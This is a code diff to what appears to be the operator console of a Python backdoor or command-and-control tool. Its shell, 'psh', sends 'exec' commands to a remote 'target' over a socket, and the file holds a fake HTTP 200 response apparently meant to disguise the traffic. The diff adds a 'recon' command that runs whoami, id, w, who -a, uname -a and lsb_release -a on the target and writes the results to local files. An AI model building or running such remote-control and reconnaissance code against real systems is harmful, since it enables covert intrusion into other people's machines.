@@ -4,9 +4,11 @@ import re
 import sys
 import base64
 import socket
+import os.path
 import argparse
 from datetime import datetime
 
+OUT = 'archive'
 SIZE = 1024
 FAKEOK = """HTTP/1.1 200 OK\r
 Date: Tue, 19 Mar 2013 22:12:25 GMT\r
@@ -27,7 +29,7 @@ def get_args():
 
 
 def ctrl_shell_server(s, PORT):
-    cmds = ['exit', 'help', 'exec']
+    cmds = ['exit', 'help', 'exec', 'recon']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
     print 'Welcome to psh, the perennial shell!'
@@ -37,18 +39,36 @@ def ctrl_shell_server(s, PORT):
             inp = raw_input('psh > ')
             if inp == '':
                 continue
+            # exit
             elif inp == cmds[0]:
                 break
-            elif inp.startswith(cmds[1]):
+            # help
+            elif inp == cmds[1]:
                 print 'Commands:'
                 for cmd in cmds:
                     print '  {}'.format(cmd)
-            elif inp.startswith(cmds[2]):
+            # exec
+            elif inp.split()[0] == cmds[2]:
                 if re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                    print ctrl_shell_exec(conn, inp)
+                    print ctrl_shell_exchange(conn, inp)
                 else:
                     print 'Execute commands on target.'
                     print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
+                    print '\nNote: If the command isn\'t found on target (via `which\'), it will be discarded to make less noise.'
+            # recon
+            elif inp.split()[0] == cmds[3]:
+                if re.search('^recon( -o)?$', inp):
+                    response = ctrl_shell_exchange(conn, inp.split()[0])
+                    print response
+                    if '-o' in inp:
+                        ctrl_shell_recon_write(response, OUT)
+                else:
+                    print 'Basic reconaissance of target.'
+                    print 'usage: recon [-h] [-o]'
+                    print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
+                    print '\noptions:'
+                    print '-h\t\tshow help'
+                    print '-o\t\twrite results to file in {}/'.format(OUT)
             else:
                 print 'psh: {}: command not found'.format(inp.split()[0])
         except KeyboardInterrupt:
@@ -57,9 +77,22 @@ def ctrl_shell_server(s, PORT):
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
 
-def ctrl_shell_exec(conn, inp):
+def ctrl_shell_exchange(conn, inp):
     socksend(conn, inp)
     return sockrecv(conn)
+
+
+def ctrl_shell_recon_write(response, out_dir):
+    ts = datetime.now().strftime('%Y%m%d%S%f')
+    out_ts_dir = '{}/{}'.format(out_dir, ts[:-8])
+    outfile = '{}/recon-{}.txt'.format(out_ts_dir, ts)
+    if not os.path.isdir(out_dir):
+        os.mkdir(out_dir)
+    if not os.path.isdir(out_ts_dir):
+        os.mkdir(out_ts_dir)
+    with open(outfile, 'w') as f:
+        f.write(response)
+        print 'psh : Recon log written to {}'.format(outfile)
 
 
 def socksend(s, msg):
